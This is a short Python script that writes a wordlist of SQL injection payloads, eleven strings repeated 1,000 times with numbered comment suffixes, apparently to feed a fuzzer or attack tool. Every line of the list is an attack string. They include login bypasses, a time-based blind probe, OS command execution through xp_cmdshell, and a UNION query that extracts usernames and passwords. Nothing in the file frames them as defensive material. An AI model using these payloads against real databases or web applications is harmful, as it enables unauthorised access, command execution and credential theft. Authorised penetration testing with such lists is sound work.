sqli_payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1#",
    "' OR sleep(5)--",
    "'; EXEC xp_cmdshell('dir');--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT username, password FROM users--",
    "admin' --",
    "1' or '1'='1",
]

with open("sqli_payloads.txt", "w", encoding="utf-8") as f:
    for i in range(1000):
        for payload in sqli_payloads:
            f.write(f"{payload} --{i}\n")
